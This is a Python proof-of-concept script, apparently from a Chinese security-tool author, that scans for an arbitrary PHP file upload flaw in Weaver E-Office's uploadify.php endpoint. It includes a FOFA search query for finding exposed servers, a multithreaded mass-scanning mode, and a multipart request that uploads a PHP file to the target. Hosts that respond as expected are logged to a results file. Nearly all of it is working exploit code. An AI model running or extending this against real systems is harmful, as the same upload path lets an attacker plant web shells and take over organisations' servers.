# 泛微E-Office uploadify.php后台文件上传漏洞
# FOFA:app.name="泛微 e-office OA"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def bunner():
    test = """
\x1b[38m███████╗     ██████╗ ███████╗███████╗██╗ ██████╗███████╗
\x1b[36m██╔════╝    ██╔═══██╗██╔════╝██╔════╝██║██╔════╝██╔════╝
\x1b[34m█████╗█████╗██║   ██║█████╗  █████╗  ██║██║     █████╗  
\x1b[35m██╔══╝╚════╝██║   ██║██╔══╝  ██╔══╝  ██║██║     ██╔══╝  
\x1b[31m███████╗    ╚██████╔╝██║     ██║     ██║╚██████╗███████╗
\x1b[33m╚══════╝     ╚═════╝ ╚═╝     ╚═╝     ╚═╝ ╚═════╝╚══════╝                                                       
                                        --author:Kucei
                                        --Vession:uploadify.php UploadFile 1.0.0                                                                                                              
\x1b[0m"""
    print(test)

def main():
    bunner()
    # 初始化
    parser = argparse.ArgumentParser("泛微E-Office uploadifile.php后台文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 创建一个列表接收 文件夹的URL
        url_list = []
        with open(args.file,'r') as fp:
            # 遍历文件夹内的URL
            for url in fp.readlines():
                # append 往列表添加元素
                url_list.append(url.strip())
        # 创建线性池
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else :
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = "/inc/jquery/uploadify/uploadify.php"
    headers = {
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_14_3)AppleWebKit/605.1.15(KHTML,likeGecko)Version/12.0.3Safari/605.1.15',
        'Content-Length':'212',
        'Accept-Encoding':'gzip,deflate',
        'Connection':'close',
        'Content-Type':'multipart/form-data;boundary=gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s'
    }
    data = '--gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s\nContent-Disposition: form-data; name="Filedata"; filename="test14.php"\nContent-Type: application/octet-stream\n\n<?php echo 123;?>\n\n--gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s--'
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }

    try :
        response = requests.post(url=target+url_payload,headers=headers,data=data,proxies=proxies,verify=False,timeout=5)
        if response.status_code == 200 and len(response.text) == 10:
            print( f"[+] {target} 存在文件上传漏洞")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target}不存在漏洞")
    except :
        print(target+"--站点连接异常--")

if __name__ == '__main__':
    main()